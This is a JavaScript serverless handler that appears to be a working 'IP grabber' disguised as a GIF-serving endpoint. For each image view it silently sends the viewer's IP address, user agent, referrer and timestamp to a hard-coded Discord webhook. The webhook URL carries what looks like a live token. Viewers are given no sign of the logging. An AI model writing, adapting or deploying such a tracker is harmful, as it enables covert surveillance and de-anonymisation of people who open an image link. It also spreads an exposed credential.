export default async function handler(req, res) {
  const { id } = req.query;
  
  if (!id || !/^[1-9][0-9]?$/ .test(id)) {
    return res.status(404).end();
  }

  const gifPath = `./${id}.gif`;
  
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const ua = req.headers['user-agent'] || 'Unknown';
  const referrer = req.headers['referer'] || 'Direct';
  const now = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
  
  const webhookUrl = 'https://discord.com/api/webhooks/1490714732683067482/ae8gBJ6SmxJLVdbz5FMO55PmuhLnPPhSkp_iAvep88ScYAnlzEf6ghUVjUD_yoVRI-h2';
  
  const embeds = [{
    title: `__**GIF #${id} Viewed**__`,
    url: `https://goyzinparis.vercel.app/${id}.gif`,
    color: 3447003,
    fields: [
      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
      { name: '📱 UA', value: ua.slice(0, 50) + '...', inline: true },
      { name: '🕐 Zaman', value: now, inline: true },
      { name: '📍 Kaynak', value: `[${referrer.slice(0, 50)}...]( ${referrer} )`, inline: false }
    ],
    thumbnail: { url: `https://goyzinparis.vercel.app/${id}.gif` },
    timestamp: new Date().toISOString()
  }];
  
  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds })
  }).catch(e => console.error(e));

  // GIF serve
  try {
    const { stat, createReadStream } = await import('fs');
    const stats = await stat(gifPath);
    
    res.writeHead(200, {
      'Content-Type': 'image/gif',
      'Content-Length': stats.size,
      'Access-Control-Allow-Origin': '*',
      'Cache-Control': 'public, max-age=3600'
    });
    
    createReadStream(gifPath).pipe(res);
  } catch {
    res.status(404).end();
  }
}
